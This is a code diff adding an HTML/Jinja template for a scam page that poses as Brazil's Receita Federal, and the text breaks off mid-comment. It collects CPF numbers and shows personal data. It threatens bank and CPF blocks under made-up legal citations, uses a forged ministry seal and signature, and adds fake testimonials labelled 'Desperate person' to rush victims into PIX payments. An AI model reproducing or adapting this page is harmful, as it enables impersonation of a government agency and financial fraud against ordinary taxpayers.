@@ -1,0 +1,1659 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Receita Federal</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-400i.1701033bc0b08320.woff2') }}") format('woff2');
+            font-weight: 400;
+            font-style: italic;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
+            font-weight: 500;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+            font-weight: 600;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-700.1c7c76152b40409f.woff2') }}") format('woff2');
+            font-weight: 700;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-800.5c5f78761d00551b.woff2') }}") format('woff2');
+            font-weight: 800;
+            font-style: normal;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rawline', sans-serif;
+        }
+
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loading-logo {
+            width: 120px;
+            height: auto;
+            margin-bottom: 40px;
+        }
+
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f0f0f0;
+            border-top: 3px solid #003472;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            margin-top: 20px;
+            font-family: 'Rawline', sans-serif;
+            font-size: 16px;
+            color: #003472;
+            font-weight: 600;
+        }
+
+        .main-content {
+            display: none;
+        }
+
+        .main-content.show {
+            display: block;
+        }
+        body {
+            background-color: white;
+            padding-top: 60px;
+            color: #333333;
+            font-size: 16px;
+            line-height: 1.05;
+        }
+        h3, h4 {
+            font-size: 18px;
+            line-height: 1.05;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 20px;
+            background-color: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            height: 60px;
+        }
+        .logo {
+            width: 240px;
+            height: auto;
+        }
+        .header-icons {
+            display: flex;
+            gap: 15px;
+        }
+        .header-icon {
+            font-size: 18px;
+            color: #0056b3;
+        }
+        .hero-image {
+            width: 100%;
+            height: auto;
+            overflow: hidden;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        .hero-image img {
+            width: 100%;
+            height: auto;
+            object-fit: cover;
+        }
+        .user-info {
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            margin: 15px 0;
+            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.2);
+            background-color: white;
+            padding: 15px;
+            border-radius: 4px;
+            width: 100%;
+        }
+        .user-info:first-of-type {
+            margin-bottom: 30px;
+        }
+        .user-info-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            width: 100%;
+        }
+        .user-info p {
+            margin: 1px 0;
+            color: #333333;
+            font-size: 16px;
+        }
+        .user-info p strong {
+            font-weight: 600;
+        }
+        .user-info h3 {
+            font-weight: 700;
+            color: #0c326f;
+            margin-bottom: 4px;
+        }
+        .user-info-image {
+            width: 50px;
+            height: auto;
+            justify-self: end;
+            align-self: start;
+            margin-left: 10px;
+            filter: drop-shadow(0px 2px 3px rgba(0, 0, 0, 0.2));
+        }
+        /* Aumentando o espaçamento após os dados do contribuinte */
+        .user-info:nth-of-type(2) .user-info-content {
+            margin-bottom: 35px;
+            padding-bottom: 15px;
+        }
+        .message-box {
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            padding: 15px;
+            margin-top: 15px;
+            margin-bottom: 25px;
+            border-radius: 4px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            width: 100%;
+        }
+        .message-box p {
+            margin-bottom: 8px;
+            width: 100%;
+            font-size: 16px;
+            line-height: 1.45;
+        }
+        .message-box strong {
+            font-weight: 700;
+        }
+        .message-box .red-strong {
+            color: #a71d2a;
+            font-weight: 700;
+        }
+        .countdown-timer {
+            font-weight: bold;
+            color: #ffffff;
+            margin-top: 8px;
+            background-color: #dc3545;
+            padding: 4px 8px;
+            border-radius: 4px;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            text-align: center;
+        }
+        .tax-details {
+            margin-top: 25px;
+            padding: 15px;
+            background-color: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            position: relative;
+            overflow: hidden;
+        }
+        .tax-details::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+            height: 80%;
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/e/e8/Logo_Receita_Federal_do_Brasil.svg');
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: contain;
+            opacity: 0.05;
+            z-index: 0;
+        }
+        .tax-details > * {
+            position: relative;
+            z-index: 1;
+        }
+        .tax-details h4 {
+            font-weight: 600;
+            margin-bottom: 25px;
+            color: #0c326f;
+            line-height: 1.45;
+        }
+        .tax-details .document-data {
+            display: grid;
+            grid-template-columns: auto 1fr;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        .tax-details .document-data dt {
+            font-weight: 600;
+            text-align: right;
+            padding: 8px 15px;
+            background-color: rgba(248, 249, 250, 0.8);
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            min-width: 80px;
+            white-space: nowrap;
+            overflow-x: auto;
+        }
+        .tax-details .document-data dd {
+            font-weight: normal;
+            padding: 8px 15px;
+            background-color: rgba(255, 255, 255, 0.8);
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            margin-left: 0;
+            white-space: nowrap;
+            overflow-x: auto;
+        }
+        .tax-details .document-data dt,
+        .tax-details .document-data dd {
+            display: flex;
+            align-items: center;
+        }
+        .tax-details .total-value {
+            font-size: 20px;
+            line-height: 1.45;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #dee2e6;
+        }
+        .regularize-button {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background-color: #28a745;
+            color: white;
+            text-align: center;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            margin-top: 25px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .news-image {
+            width: 100%;
+            height: auto;
+            margin: 8px auto 0;
+            display: block;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .news-description {
+            color: #333;
+            margin-top: 12px;
+            padding: 0 4px;
+            text-align: justify;
+            width: 100%;
+        }
+        .footer {
+            background-color: #01205B;
+            color: white;
+            padding: 16px;
+            text-align: center;
+            margin-top: 40px;
+            width: 100%;
+            position: relative;
+            bottom: 0;
+        }
+        .footer-logo {
+            width: 100px;
+            margin: 0 auto 8px;
+            display: block;
+        }
+        @media (max-width: 600px) {
+            .header {
+                padding: 6px 8px;
+            }
+            .logo {
+                width: 160px;
+            }
+            .header-icons {
+                gap: 8px;
+            }
+            .header-icon {
+                font-size: 16px;
+            }
+            .message-box {
+                width: 100%;
+            }
+            .news-image {
+                max-width: 100%;
+            }
+            .news-description {
+                margin-left: 0;
+            }
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: translate(-50%, -50%) scale(1);
+            }
+            50% {
+                transform: translate(-50%, -50%) scale(1.1);
+            }
+            100% {
+                transform: translate(-50%, -50%) scale(1);
+            }
+        }
+
+        .sound-button {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(220, 53, 69, 0.9);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            animation: pulse 1s infinite ease-in-out;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+        }
+
+        .video-container {
+            position: relative;
+            width: 100%;
+            margin: 8px auto 0;
+            border-radius: 4px;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .news-video {
+            width: 100%;
+            display: block;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 2000;
+            overflow-y: auto;
+            padding: 0;
+            margin: 0;
+        }
+
+        .modal-content {
+            background-color: white;
+            width: 100vw;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            border-radius: 0;
+            box-shadow: none;
+            position: relative;
+            overflow-y: auto;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .modal-header {
+            text-align: center;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #dee2e6;
+        }
+
+        .modal-logo {
+            width: 180px;
+            height: auto;
+            margin: 0 auto;
+            display: block;
+        }
+
+        /* QR Code Container */
+        .qr-code-container {
+            display: none;
+            text-align: center;
+            padding: 15px 0 30px 0;
+            flex: 1;
+            overflow-y: auto;
+        }
+
+        .qr-code-img {
+            width: 180px;
+            height: 180px;
+            margin: 0 auto 15px;
+        }
+
+        .customer-info {
+            background-color: #f8f9fa;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 12px;
+            border-left: 4px solid #0c326f;
+            text-align: left;
+        }
+
+        .customer-info p {
+            margin: 3px 0;
+            color: #333;
+            text-align: left;
+        }
+
+        .customer-info .total-amount {
+            color: #dc3545;
+            font-weight: 700;
+            margin-top: 8px;
+            font-size: 16px;
+        }
+
+        .warning-text {
+            color: white;
+            background: linear-gradient(135deg, #dc3545, #c82333);
+            border: 2px solid #a71e2a;
+            padding: 15px;
+            border-radius: 2px;
+            margin: 15px 0;
+            font-weight: 600;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(220, 53, 69, 0.3);
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        .countdown-timer-pix {
+            background-color: #dc3545;
+            color: #fff;
+            font-weight: 800;
+            padding: 8px;
+            border-radius: 4px;
+            margin: 0 0 10px 0;
+            text-align: center;
+            font-size: 18px;
+        }
+
+        .pix-code-container {
+            background-color: #fff;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            padding: 8px;
+            margin: 12px 0;
+        }
+
+        .pix-code {
+            font-family: monospace;
+            word-break: break-all;
+            margin: 0;
+            padding: 8px;
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .copy-button-container {
+            text-align: center;
+            margin: 20px 0 30px 0;
+            padding-bottom: 30px;
+        }
+
+        .copy-pix-button {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            width: 80%;
+            justify-content: center;
+        }
+
+        .copy-pix-button:hover {
+            background-color: #218838;
+        }
+
+        /* Ministry Seal Styles */
+        .ministry-seal-container {
+            text-align: center;
+            margin: 20px 0;
+            padding: 15px 0;
+        }
+
+        .ministry-seal {
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .ministry-seal-img {
+            width: 60px;
+            height: 60px;
+            object-fit: contain;
+        }
+
+        .ministry-text {
+            margin-top: 8px;
+        }
+
+        .ministry-name {
+            font-size: 14px;
+            font-weight: 700;
+            color: #333;
+            margin: 0 0 4px 0;
+            letter-spacing: 0.5px;
+        }
+
+        .ministry-gov {
+            font-size: 12px;
+            font-weight: 600;
+            color: #666;
+            margin: 0;
+            letter-spacing: 0.3px;
+        }
+
+        /* Modal no mobile */
+        @media (max-width: 600px) {
+            .modal {
+                width: 100vw;
+                height: 100vh;
+                padding: 0;
+            }
+            
+            .modal-content {
+                width: 100vw;
+                min-height: 100vh;
+                padding: 15px;
+                box-sizing: border-box;
+            }
+            
+            .copy-button-container {
+                margin: 20px 0 50px 0;
+                padding-bottom: 50px;
+            }
+            
+            .copy-pix-button {
+                width: 90%;
+                padding: 15px 20px;
+                font-size: 16px;
+            }
+        }
+
+        /* Script JavaScript adicional para o cronômetro */
+        @keyframes copy-feedback {
+            0% { background-color: #0c326f; }
+            50% { background-color: #28a745; }
+            100% { background-color: #0c326f; }
+        }
+
+        .copy-success {
+            animation: copy-feedback 1s ease;
+        }
+
+        /* Loader Animation */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loader-container {
+            text-align: center;
+            padding: 30px 0;
+        }
+
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(12, 50, 111, 0.1);
+            border-radius: 50%;
+            border-top-color: #0c326f;
+            animation: spin 1s ease-in-out infinite;
+            margin: 0 auto 15px;
+        }
+
+        .loader-text {
+            color: #0c326f;
+            font-weight: 600;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Logo_Receita_Federal_do_Brasil.svg/1194px-Logo_Receita_Federal_do_Brasil.svg.png" alt="Receita Federal" class="loading-logo">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Carregando dados...</div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content" id="mainContent">
+        <div class="header">
+        <img alt="Logo da Receita Federal" class="logo" src="https://servicos.receitafederal.gov.br/assets/images/receitaAzul.svg"/>
+        <div class="header-icons">
+            <i class="fas fa-search header-icon"></i>
+            <i class="fas fa-question-circle header-icon"></i>
+            <i class="fas fa-adjust header-icon"></i>
+        </div>
+    </div>
+    <div class="hero-image">
+        <img alt="Aviso sobre novas regras do PIX" src="https://i.ibb.co/cSFXVMXx/Aviso-funcionamento-de-loja-simples-verde-vermelho-story-do-instagram-1080-x-400-px-4.png">
+    </div>
+    {% if show_confirmation %}
+    <div class="user-info">
+        <div class="user-info-content">
+            <div class="user-info-text">
+                <h3>INTIMAÇÃO FISCAL - RECEITA FEDERAL DO BRASIL</h3>
+                <p style="text-align: justify; line-height: 1.4;">
+                    <strong>{{ customer.nome }}</strong>, portador(a) do CPF <strong>{{ customer.cpf }}</strong>, 
+                    em conformidade com o artigo 142 do CTN, informamos que após cruzamento de dados das suas 
+                    declarações do Imposto de Renda Pessoa Física do ano de 2020, foi identificada 
+                    uma pendência tributária em sua situação fiscal.
+                </p>
+                <p style="text-align: justify; line-height: 1.4; margin-top: 10px;">
+                    <strong style="color: #721c24;">PRAZO FINAL:</strong> {{ customer.today_date }} é o último dia para regularização. 
+                    O não cumprimento desta intimação resultará nas seguintes punições conforme 
+                    Instrução Normativa RFB nº 1.888/2019:
+                </p>
+                <ul style="margin: 10px 0; padding-left: 0; line-height: 1.6; list-style: none;">
+                    <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">●</span><strong>Bloqueio de contas bancárias e cartões</strong></li>
+                    <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">●</span><strong>Impossibilidade de movimentar PIX, TED e DOC</strong></li>
+                    <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">●</span><strong>Restrições no Banco Central e SERASA</strong></li>
+                    <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">●</span><strong>Suspensão do acesso a benefícios federais (Auxílio, Bolsa Família, etc.)</strong></li>
+                    <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">●</span><strong>Impedimento para financiamentos, empréstimos e compras no crédito</strong></li>
+                    <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">●</span><strong>Aplicação de multa automática de até 150%</strong></li>
+                </ul>
+                <p style="margin-top: 12px; font-weight: 600;">
+                    Confirme se os dados abaixo correspondem à sua identificação:
+                </p>
+            </div>
+        </div>
+        <div style="background-color: #f8f9fa; padding: 15px; border-radius: 4px; margin-top: 10px; border-left: 4px solid #0c326f;">
+            <p><strong>Nome:</strong> {{ customer.nome }}</p>
+            <p><strong>CPF:</strong> {{ customer.cpf }}</p>
+            {% if customer.data_nascimento %}
+            {% set date_parts = customer.data_nascimento.split(' ')[0].split('-') if ' ' in customer.data_nascimento else customer.data_nascimento.split('-') %}
+            {% if date_parts|length == 3 %}
+            <p><strong>Data de Nascimento:</strong> {{ date_parts[2] }}/{{ date_parts[1] }}/{{ date_parts[0] }}</p>
+            {% else %}
+            <p><strong>Data de Nascimento:</strong> {{ customer.data_nascimento }}</p>
+            {% endif %}
+            {% endif %}
+            {% if customer.nome_mae %}
+            <p><strong>Nome da Mãe:</strong> {{ customer.nome_mae }}</p>
+            {% endif %}
+        </div>
+        <div style="margin-top: 20px; text-align: center;">
+            <div onclick="confirmData()" style="background: #f8f9fa; border: 2px solid #dee2e6; border-radius: 0px; padding: 20px; max-width: 320px; margin: 0 auto; cursor: pointer; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
+                <h3 style="margin: 0 0 8px 0; font-size: 14px; font-weight: bold; letter-spacing: 1px; color: #000;">
+                    MINISTÉRIO DA JUSTIÇA
+                </h3>
+                <h4 style="margin: 0 0 15px 0; font-size: 12px; font-weight: bold; letter-spacing: 0.5px; color: #000;">DOCUMENTO OFICIAL</h4>
+                <div style="width: 70px; height: 70px; margin: 0 auto 12px; display: flex; align-items: center; justify-content: center;">
+                    <img src="https://i.postimg.cc/7YpN6X2K/brasao-1.png" alt="Brasão do Ministério da Justiça" style="width: 60px; height: 60px; object-fit: contain;">
+                </div>
+                <p style="margin: 8px 0; font-size: 13px; line-height: 1.4; color: #333; text-align: justify;">
+                    Este documento foi assinado em <strong>{{ customer.today_date }}</strong> e possui 
+                    permissão do Ministério da Justiça para fazer cumprir todos os bloqueios e restrições 
+                    supracitados em face de <strong>{{ customer.nome }}</strong>, portador do CPF nº <strong>{{ customer.cpf }}</strong>, 
+                    conforme legislação vigente.
+                </p>
+                <div style="margin: 15px auto; padding: 12px; max-width: 280px;">
+                    <p style="margin: 0 0 8px 0; font-size: 12px; font-weight: 600; color: #666;">
+                        Secretário Especial da Receita Federal
+                    </p>
+                    <p style="margin: 0; font-size: 18px; font-family: 'Brush Script MT', cursive, 'Lucida Handwriting', 'Apple Chancery', fantasy; color: #000; font-weight: normal; font-style: italic;">
+                        Robinson Sakiyama Barreirinhas
+                    </p>
+                    <div style="width: 200px; height: 1px; background-color: #333; margin: 3px auto 0; opacity: 0.6;"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    {% elif show_cpf_search %}
+    <div class="user-info">
+        <div class="user-info-content">
+            <div class="user-info-text">
+                <h3>CONSULTA DE DÉBITOS TRIBUTÁRIOS</h3>
+                <p style="text-align: justify; line-height: 1.4; margin-bottom: 30px;">
+                    Para consultar débitos tributários, digite seu CPF no campo abaixo e clique em "Realizar consulta".
+                </p>
+
+                <form id="cpfForm" style="margin-top: 30px;">
+                    <div style="margin-bottom: 20px;">
+                        <label for="cpfInput" style="display: block; margin-bottom: 8px; font-weight: 600; color: #0c326f;">
+                            Digite seu CPF:
+                        </label>
+                        <input 
+                            type="text" 
+                            id="cpfInput" 
+                            name="cpf" 
+                            placeholder="000.000.000-00"
+                            maxlength="14"
+                            style="width: 100%; padding: 12px; border: 2px solid #dee2e6; border-radius: 4px; font-size: 16px; font-family: monospace;"
+                            required
+                        >
+                    </div>
+                    
+                    <button 
+                        type="submit" 
+                        style="width: 100%; padding: 15px; background-color: #0c326f; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.3s ease;"
+                        onmouseover="this.style.backgroundColor='#084080'"
+                        onmouseout="this.style.backgroundColor='#0c326f'"
+                    >
+                        🔍 REALIZAR CONSULTA
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+    {% else %}
+    <div class="user-info">
+        <div class="user-info-content">
+            <div class="user-info-text">
+                <h3>Notícia na mídia</h3>
+                <p><strong>Programa:</strong> Jornal da Band</p>
+                <p><strong>Data:</strong> 05 de março de 2025</p>
+            </div>
+        </div>
+        <div class="video-container">
+            <video id="newsVideo" class="news-video" autoplay muted playsinline webkit-playsinline>
+                <source src="{{ url_for('static', filename='videos/news.mp4') }}" type="video/mp4">
+                Seu navegador não suporta o elemento de vídeo.
+            </video>
+            <button id="soundButton" class="sound-button">
+                <i class="fas fa-volume-up"></i>
+                <span>CLIQUE PARA OUVIR!</span>
+            </button>
+        </div>
+        <p class="news-description" id="newsDescription"></p>
+    </div>
+    {% endif %}
+    
+    {% if show_confirmation %}
+    <div class="user-info">
+            <div class="user-info-content">
+                <div class="user-info-text">
+                    <h3>DADOS DO DEVEDOR</h3>
+                    <p><strong>NOME:</strong> {{ customer.nome.upper() }}</p>
+                    <p><strong>CPF:</strong> <strong>{{ customer.cpf }}</strong></p>
+                </div>
+                <img src="https://i.ibb.co/xKfzBFbn/download-1.png" alt="User profile icon" class="user-info-image">
+            </div>
+
+            <div class="tax-details">
+                <h4>Divergências calculadas pela Receita Federal que devem ser pagas:</h4>
+                
+                <div style="background-color: #f8f9fa; padding: 15px; border-radius: 4px; margin: 15px 0; border-left: 4px solid #0c326f;">
+                    <p style="margin: 0 0 10px 0; font-size: 14px;"><strong>Valor original do débito:</strong> R$ 348,86</p>
+                    <p style="margin: 0; font-size: 16px; font-weight: bold; color: #0c326f;"><strong>Valor com desconto:</strong> R$ 126,62</p>
+                </div>
+                
+                <dl class="document-data">
+                    <dt>IRPF</dt>
+                    <dd>R$ 126,62</dd>
+                </dl>
+                                
+                <div style="background-color: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; padding: 20px; margin: 15px 0; border-radius: 4px; border-left: 4px solid #dc3545;">
+                    <p style="margin: 0 0 15px 0; font-weight: bold; font-size: 16px; text-align: center;">⚠️ NOTIFICAÇÃO OFICIAL - PRAZO FINAL</p>
+                    <p style="margin: 0 0 15px 0; line-height: 1.5; text-align: justify;">
+                        O não cumprimento da obrigação tributária até <strong>02/08/2025</strong> resultará na imposição de multa adicional no valor de <strong>R$ 1.985,00</strong> e na aplicação das seguintes medidas administrativas pela Receita Federal do Brasil:
+                    </p>
+                    <div style="margin: 15px 0;">
+                        <div style="background-color: rgba(255,255,255,0.1); padding: 10px; margin: 8px 0; border-radius: 3px;">
+                            <strong>1. BLOQUEIO BANCÁRIO:</strong> Suspensão de todas as contas correntes, poupanças e investimentos
+                        </div>
+                        <div style="background-color: rgba(255,255,255,0.1); padding: 10px; margin: 8px 0; border-radius: 3px;">
+                            <strong>2. RESTRIÇÃO CREDITÍCIA:</strong> Inscrição do nome nos órgãos de proteção ao crédito (SPC/SERASA)
+                        </div>
+                        <div style="background-color: rgba(255,255,255,0.1); padding: 10px; margin: 8px 0; border-radius: 3px;">
+                            <strong>3. BLOQUEIO DO CPF:</strong> Impossibilidade de realizar transações financeiras e operações bancárias
+                        </div>
+                    </div>
+                </div>
+                
+                <p>Para regularizar a situação fiscal e evitar a aplicação das penalidades previstas no documento oficial, é obrigatório efetuar o pagamento das divergências calculadas pela Receita Federal no valor total de <strong>R$ 126,62</strong>.</p>
+                <button class="regularize-button">Regularizar agora</button>
+            </div>
+        </div>
+        
+        <!-- Comments Section -->
+        <div style="background-color: #f8f9fa; border: 1px solid #dee2e6; border-radius: 8px; margin: 30px auto; padding: 25px; max-width: 100%;">
+            <h3 style="color: #0c326f; font-weight: 600; margin-bottom: 20px; text-align: center; font-size: 18px;">
+                <i class="fas fa-comments" style="margin-right: 8px;"></i>
+                Relatos de outros contribuintes
+            </h3>
+            
+            <div style="display: grid; gap: 15px;">
+                <!-- Comment 1 - Desperate person -->
+                <div style="background: white; border-left: 4px solid #dc3545; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
+                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                        <div style="width: 32px; height: 32px; background: #dc3545; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
+                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
+                        </div>
+                        <div>
+                            <strong style="color: #333;">Maria Silva</strong>
+                            <span style="color: #666; font-size: 12px; margin-left: 8px;">há 2 horas</span>
+                        </div>
+                    </div>
+                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
+                        GENTE, PELO AMOR DE DEUS, PAGUEM URGENTE! Eu ignorei essas notificações por semanas achando que era golpe. Hoje acordei com TODAS as minhas contas bloqueadas, cartão cancelado e PIX suspenso. Não consigo nem comprar pão! Estou desesperada tentando regularizar mas agora é muito mais caro... 😭
+                    </p>
+                </div>
+
+                <!-- Comment 2 - Success story -->
+                <div style="background: white; border-left: 4px solid #28a745; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
+                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                        <div style="width: 32px; height: 32px; background: #28a745; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
+                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
+                        </div>
+                        <div>
+                            <strong style="color: #333;">João Santos</strong>
+                            <span style="color: #666; font-size: 12px; margin-left: 8px;">há 3 horas</span>
+                        </div>
+                    </div>
+                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
+                        Acabei de receber a confirmação! Paguei 248 reais ontem e hoje meu CPF já está regularizado. Valeu muito a pena pegar o desconto. Recomendo a todos que não deixem para depois, o processo é rápido e seguro. 👍
+                    </p>
+                </div>
+
+                <!-- Comment 3 - Desperate person -->
+                <div style="background: white; border-left: 4px solid #dc3545; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
+                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                        <div style="width: 32px; height: 32px; background: #dc3545; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
+                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
+                        </div>
+                        <div>
+                            <strong style="color: #333;">Carlos Eduardo</strong>
+                            <span style="color: #666; font-size: 12px; margin-left: 8px;">há 1 hora</span>
+                        </div>
+                    </div>
+                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
+                        Pessoal, estou com o mesmo problema da Maria. Pensei que fosse spam e agora estou pagando caro pela besteira. Minha conta do banco está bloqueada há 3 dias, não consigo fazer nenhuma transferência.... Como faço para resolver isso HOJE mesmo?
+                    </p>
+                </div>
+
+                <!-- Comment 4 - Success story -->
+                <div style="background: white; border-left: 4px solid #28a745; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
+                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                        <div style="width: 32px; height: 32px; background: #28a745; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
+                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
+                        </div>
+                        <div>
+                            <strong style="color: #333;">Ana Paula</strong>
+                            <span style="color: #666; font-size: 12px; margin-left: 8px;">há 5 horas</span>
+                        </div>
+                    </div>
+                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
+                        Gente, paguei de manhã e à tarde já recebi confirmação que estava tudo regularizado. O chat com a auditora foi muito esclarecedor! 😊
+                    </p>
+                </div>
+
+                <!-- Comment 5 - Desperate person -->
+                <div style="background: white; border-left: 4px solid #dc3545; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
+                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                        <div style="width: 32px; height: 32px; background: #dc3545; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
+                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
+                        </div>
+                        <div>
+                            <strong style="color: #333;">Roberto Lima</strong>
+                            <span style="color: #666; font-size: 12px; margin-left: 8px;">há 30 min</span>
+                        </div>
+                    </div>
+                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
+                        URGENTE!!! Alguém sabe se tem como reverter o bloqueio? Meu salário caiu na conta hoje e não consigo sacar NADA! Estou no banco agora e me disseram que o problema é com a Receita Federal. Preciso de ajuda, tenho contas para pagar hoje...
+                    </p>
+                </div>
+
+                <!-- Comment 6 - Success story -->
+                <div style="background: white; border-left: 4px solid #28a745; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
+                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
